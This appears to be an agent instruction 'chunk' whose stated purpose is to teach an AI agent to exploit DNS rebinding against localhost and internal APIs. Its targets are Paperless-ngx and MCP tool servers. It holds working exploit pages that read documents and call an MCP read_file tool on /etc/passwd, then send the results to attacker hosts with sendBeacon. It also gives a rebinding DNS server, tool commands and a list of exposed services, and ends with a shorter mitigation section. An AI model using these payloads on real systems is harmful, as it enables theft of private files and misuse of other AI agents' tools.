# DNS Rebinding Against Internal APIs — Agent Chunk 90a
> Source: CVE databases (2025), Paperless-ngx GHSA, MCP TypeScript SDK analysis, singularity/rbndr tools, DNS rebinding research
> Purpose: Teaches the agent to exploit DNS rebinding attacks against internal/localhost APIs, including MCP server endpoints and document management systems
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing APIs that are bound to localhost or internal networks and rely on network-level access control rather than authentication. DNS rebinding bypasses same-origin policy and IP-based access controls by manipulating DNS resolution. This is particularly relevant for developer tools, local services, and MCP ecosystem servers.

---

## 1. DNS Rebinding Attack Methodology

### Core Mechanism
```
DNS rebinding exploits the gap between DNS resolution and HTTP request:

1. Victim visits attacker.com (resolves to attacker IP: 93.184.216.34)
2. Attacker's page loads JavaScript
3. JavaScript makes request to attacker.com/api (same origin)
4. DNS TTL expires (attacker sets TTL=0)
5. attacker.com now resolves to 127.0.0.1 (or internal IP)
6. Browser sends request to 127.0.0.1 with Origin: attacker.com
7. Internal API at 127.0.0.1 processes the request
8. Response is readable by attacker's JavaScript (same origin)

Key: The browser's same-origin policy is based on the HOSTNAME,
not the IP address. Same hostname = same origin, even if IP changed.
```

### Attack Flow Diagram
```
Victim Browser          Attacker DNS           Internal API (127.0.0.1)
     |                       |                         |
     |---DNS: attacker.com-->|                         |
     |<--A: 93.184.216.34---|                         |
     |                       |                         |
     |---GET attacker.com/-->93.184.216.34             |
     |<--JavaScript----------|                         |
     |                       |                         |
     | [TTL expires, JS triggers new request]          |
     |                       |                         |
     |---DNS: attacker.com-->|                         |
     |<--A: 127.0.0.1-------|                         |
     |                       |                         |
     |---GET attacker.com/api------------------->|
     |<--{sensitive: data}----------------------|
     |                       |                         |
     |---POST attacker.com/exfil-->93.184.216.34       |
     | [sends stolen data to attacker]                 |
```

---

## 2. CVE-2025-69660 & Paperless-ngx GHSA

### Paperless-ngx DNS Rebinding
```
Paperless-ngx: Open-source document management system
Often runs on localhost:8000 with no authentication (home network)
GHSA advisory: DNS rebinding allows remote access to local instance

Attack scenario:
1. User runs Paperless-ngx on 127.0.0.1:8000 (no auth for local access)
2. User visits attacker's webpage
3. DNS rebinding redirects requests to 127.0.0.1:8000
4. Attacker's JavaScript accesses all documents via API
```

### Exploitation Payload
```html
<!-- Host on attacker.com -->
<html>
<body>
<script>
// Phase 1: Load normally from attacker's server
// Phase 2: After DNS rebinding, requests go to victim's localhost

function exploit() {
  // Paperless-ngx API endpoints
  var endpoints = [
    '/api/documents/',           // List all documents
    '/api/correspondents/',      // List correspondents
    '/api/tags/',                // List tags
    '/api/documents/1/download/' // Download first document
  ];
  
  endpoints.forEach(function(ep) {
    fetch('http://rebind.attacker.com:8000' + ep, {
      credentials: 'include'
    })
    .then(r => r.text())
    .then(data => {
      // Exfiltrate via separate channel (image beacon to stable domain)
      navigator.sendBeacon('https://collect.attacker.com/steal', 
        JSON.stringify({endpoint: ep, data: data}));
    });
  });
}

// Wait for DNS rebinding to take effect
setTimeout(exploit, 3000);
</script>
</body>
</html>
```

### CVE-2025-69660: Similar Pattern
```bash
# Multiple 2025 CVEs follow the same pattern:
# Local service trusts any request from localhost
# No CORS restrictions (or Access-Control-Allow-Origin: *)
# No authentication for local connections
# DNS rebinding bypasses "local-only" assumption
```

---

## 3. MCP Ecosystem Attack Surface

### MCP TypeScript SDK — Pre-v1.24.0 Vulnerability
```
Model Context Protocol (MCP) servers typically:
- Run on localhost (127.0.0.1 or 0.0.0.0)
- Expose HTTP/SSE endpoints for tool execution
- Trust requests from local clients without authentication
- Have access to filesystem, databases, APIs via configured tools

Before SDK v1.24.0:
- No DNS rebinding protection
- No Origin header validation
- Any web page could interact with local MCP servers via DNS rebinding
- Attacker could invoke any MCP tool the server exposes
```

### MCP DNS Rebinding Exploitation
```html
<script>
// Target: MCP server on localhost:3000
// After DNS rebinding resolves attacker.com to 127.0.0.1

async function exploitMCP() {
  // Step 1: List available tools
  let tools = await fetch('http://rebind.attacker.com:3000/tools', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      "jsonrpc": "2.0",
      "method": "tools/list",
      "id": 1
    })
  }).then(r => r.json());
  
  // Step 2: Invoke file system tool to read sensitive files
  let result = await fetch('http://rebind.attacker.com:3000/tools', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      "jsonrpc": "2.0",
      "method": "tools/call",
      "params": {
        "name": "read_file",
        "arguments": {"path": "/etc/passwd"}
      },
      "id": 2
    })
  }).then(r => r.json());
  
  // Step 3: Exfiltrate
  navigator.sendBeacon('https://attacker.com/collect',
    JSON.stringify({tools: tools, data: result}));
}

setTimeout(exploitMCP, 3000);
</script>
```

### Protection Added in SDK v1.24.0
```typescript
// MCP TypeScript SDK now validates Origin/Host headers
// Rejects requests where Origin doesn't match expected localhost values

// Server-side check:
const allowedOrigins = ['http://localhost', 'http://127.0.0.1'];
const origin = request.headers.get('Origin');
if (origin && !allowedOrigins.some(ao => origin.startsWith(ao))) {
  return new Response('Forbidden', { status: 403 });
}
```

---

## 4. DNS Rebinding Tools

### Singularity (by NCC Group)
```bash
# Full DNS rebinding attack framework
git clone https://github.com/nccgroup/singularity.git
cd singularity

# Start DNS server and HTTP server
sudo node singularity.js --target 127.0.0.1 --port 8080

# Singularity features:
# - Automatic TTL management
# - Multiple rebinding strategies (time-based, multi-answer)
# - Built-in payload manager
# - Supports targeting specific ports
# - Includes payload for common services (Jenkins, Kubernetes, etc.)
```

### rbndr (DNS Rebinding Service)
```bash
# rbndr provides DNS names that alternate between IPs
# Format: <ip1>.<ip2>.rbndr.us

# Example: First query returns 93.184.216.34, second returns 127.0.0.1
# DNS name: 93.184.216.34.127.0.0.1.rbndr.us

# Use in exploit:
curl http://93.184.216.34.127.0.0.1.rbndr.us:8080/api/sensitive
# First request: goes to 93.184.216.34 (attacker)
# Second request: goes to 127.0.0.1 (victim's localhost)
```

### Custom DNS Server
```python
# Minimal DNS rebinding server
from dnslib import DNSRecord, QTYPE, RR, A
from dnslib.server import DNSServer, BaseResolver
import time

class RebindResolver(BaseResolver):
    def __init__(self):
        self.request_count = {}
    
    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)
        
        # Track requests per domain
        self.request_count[qname] = self.request_count.get(qname, 0) + 1
        
        if self.request_count[qname] <= 1:
            # First request: return attacker IP
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("93.184.216.34"), ttl=0))
        else:
            # Subsequent requests: return target (localhost)
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
        
        return reply

resolver = RebindResolver()
server = DNSServer(resolver, port=53, address="0.0.0.0")
server.start()
```

---

## 5. Common Vulnerable Services

```
Service                    Default Port    Risk
-------                    ------------    ----
MCP Servers                3000-9000       Tool invocation, file access
Jupyter Notebook           8888            Code execution
Docker API                 2375            Container escape
Kubernetes Dashboard       8443            Cluster access
Redis                      6379            Data access, RCE (modules)
Elasticsearch              9200            Data access
CouchDB                    5984            Data access
Consul                     8500            Service mesh config
Vault                      8200            Secret access
Grafana                    3000            Dashboard access
Jenkins                    8080            Build system access
Prometheus                 9090            Metric/config access
Paperless-ngx              8000            Document access
Home Assistant             8123            IoT control
```

---

## 6. DNS Pinning Mitigation

### Application-Level Protection
```python
# Python: Resolve DNS once and pin the IP
import socket
import requests
from urllib.parse import urlparse

def safe_request(url):
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    # Resolve hostname to IP
    ip = socket.gethostbyname(hostname)
    
    # Check against blocklist
    import ipaddress
    addr = ipaddress.ip_address(ip)
    if addr.is_private or addr.is_loopback or addr.is_link_local:
        raise ValueError(f"Blocked: {hostname} resolves to private IP {ip}")
    
    # Make request using resolved IP (pin the DNS result)
    pinned_url = url.replace(hostname, ip)
    return requests.get(pinned_url, headers={'Host': hostname}, timeout=5)
```

### Browser-Level Defenses
```
Modern browsers implement partial DNS pinning:
- Chrome: Pins DNS for the lifetime of the socket
- Firefox: DNS cache minimum TTL of 60 seconds
- Safari: Similar to Chrome

These mitigations reduce but do not eliminate the risk:
- Multi-answer DNS responses can bypass pinning
- Connection exhaustion forces new DNS lookups
- WebSocket connections may resolve DNS independently
```

---

## 7. Mitigation Checklist
- Never rely solely on network-level access control (localhost binding)
- Implement authentication for ALL API endpoints, even localhost-only ones
- Validate Origin and Host headers; reject unexpected origins
- Bind to 127.0.0.1, not 0.0.0.0 (limits to loopback only)
- Set restrictive CORS: do not use `Access-Control-Allow-Origin: *` on local services
- Implement DNS pinning in HTTP clients (resolve once, reuse IP)
- Use HTTPS with valid certificates even for local services (prevents MITM + validates identity)
- MCP servers: upgrade to SDK v1.24.0+ with built-in DNS rebinding protection
- Block private IP ranges in DNS responses at the resolver level
